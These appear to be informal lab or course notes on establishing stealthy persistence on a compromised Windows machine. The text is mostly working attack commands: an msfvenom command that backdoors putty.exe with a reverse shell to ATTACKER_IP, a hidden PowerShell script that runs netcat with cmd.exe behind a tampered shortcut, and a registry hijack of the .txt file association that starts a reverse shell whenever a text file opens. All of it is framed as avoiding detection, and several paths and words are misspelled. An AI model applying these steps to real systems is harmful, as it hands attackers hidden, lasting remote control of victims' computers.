Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.


putty.exe
========
->> if putty.exe download the file(putty.exe) to your machine and modify with msfconsole

cmd->> msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe

gives a revers shell anytime putty is executed 

short cut files
========
->> tempering with properties of short cut files to lead to launching other malicious binary programs before launching main program like a reverse shell or sort 


->> make a ps script add this command and make shirtcut point to it

cmd->> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe

this should now be in new shortcut path vv
->> powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1


hijacking file association
=========
->> mainly means forcing victim system to launch a shell anytime a file type is opened

->> HKLM\Software\Classes\
->> txt or anytype you want to use 
->> check program id (txtfile)
->> still under class search for the sub key in shell\open\command

In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\

psscript->> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]

->> Now let's change the registry key to run our backdoor script in a hidden window:

->>  powershell.exe -WindowStyle hidden C:\\systme32/file.ps1




